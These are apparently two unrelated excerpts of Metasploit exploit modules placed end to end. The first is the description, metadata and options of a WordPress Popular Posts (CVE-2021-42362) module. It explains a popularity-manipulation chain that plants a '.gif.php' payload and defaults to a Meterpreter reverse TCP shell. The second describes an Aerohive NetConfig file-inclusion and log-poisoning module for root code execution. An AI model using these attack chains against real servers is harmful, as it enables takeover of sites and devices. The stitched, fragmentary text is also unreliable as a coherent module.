The FQDN must also not resolve to a reserved address (192/172/127/10).  The server must also respond to a HEAD request          for the payload, prior to getting a GET request.          This exploit leverages an authenticated improper input validation in Wordpress plugin Popular Posts \u003c= 5.3.2.          The exploit chain is rather complicated.  Authentication is required and 'gd' for PHP is required on the server.          Then the Popular Post plugin is reconfigured to allow for an arbitrary URL for the post image in the widget.          A post is made, then requests are sent to the post to make it more popular than the previous #1 by 5. Once          the post hits the top 5, and after a 60sec (we wait 90) server cache refresh, the homepage widget is loaded          which triggers the plugin to download the payload from our server. Our payload has a 'GIF' header, and a          double extension ('.gif.php') allowing for arbitrary PHP code to be executed.        },        'License' =\u003e MSF_LICENSE,        'Author' =\u003e [          'h00die', # msf module          'Simone Cristofaro', # edb          'Jerome Bruandet' # original analysis        ],        'References' =\u003e [          [ 'EDB', '50129' ],          [ 'URL', 'https://blog.nintechnet.com/improper-input-validation-fixed-in-wordpress-popular-posts-plugin/' ],          [ 'WPVDB', 'bd4f157c-a3d7-4535-a587-0102ba4e3009' ],          [ 'URL', 'https://plugins.trac.wordpress.org/changeset/2542638' ],          [ 'URL', 'https://github.com/cabrerahector/wordpress-popular-posts/commit/d9b274cf6812eb446e4103cb18f69897ec6fe601' ],          [ 'CVE', '2021-42362' ]        ],        'Platform' =\u003e ['php'],        'Stance' =\u003e Msf::Exploit::Stance::Aggressive,        'Privileged' =\u003e false,        'Arch' =\u003e ARCH_PHP,        'Targets' =\u003e [          [ 'Automatic Target', {}]        ],        'DisclosureDate' =\u003e '2021-06-11',        'DefaultTarget' =\u003e 0,        'DefaultOptions' =\u003e {          'PAYLOAD' =\u003e 'php/meterpreter/reverse_tcp',          'WfsDelay' =\u003e 3000 # 50 minutes, other visitors to the site may trigger        },        'Notes' =\u003e {          'Stability' =\u003e [ CRASH_SAFE ],          'SideEffects' =\u003e [ ARTIFACTS_ON_DISK, IOC_IN_LOGS, CONFIG_CHANGES ],          'Reliability' =\u003e [ REPEATABLE_SESSION ]        }      )    )    register_options [      OptString.new('USERNAME', [true, 'Username of the account', 'admin']),      OptString.new('PASSWORD', [true, 'Password of the account', 'admin']),      OptString.new('TARGETURI', [true, 'The base path of the Wordpress server', '/']),      # https://github.com/WordPress/wordpress-develop/blob/5.8/src/wp-includes/http.php#L560      OptString.new('SRVHOSTNAME', [true, 'FQDN of the metasploit server.

NetConfig is the Aerohive/Extreme          Networks HiveOS administrative webinterface. Vulnerable versions          allow for LFI because they rely on a version of PHP 5 that is          vulnerable to string truncation attacks. This module leverages this          issue in conjunction with log poisoning to gain RCE as root.          Upon successful exploitation, the Aerohive NetConfig application          will hang for as long as the spawned shell remains open. Closing          the session should render the app responsive again.          The module provides an automatic cleanup option to clean the log.          However, this option is disabled by default because any modifications          to the /tmp/messages log, even via sed, may render the target          (temporarily) unexploitable. This state can last over an hour.
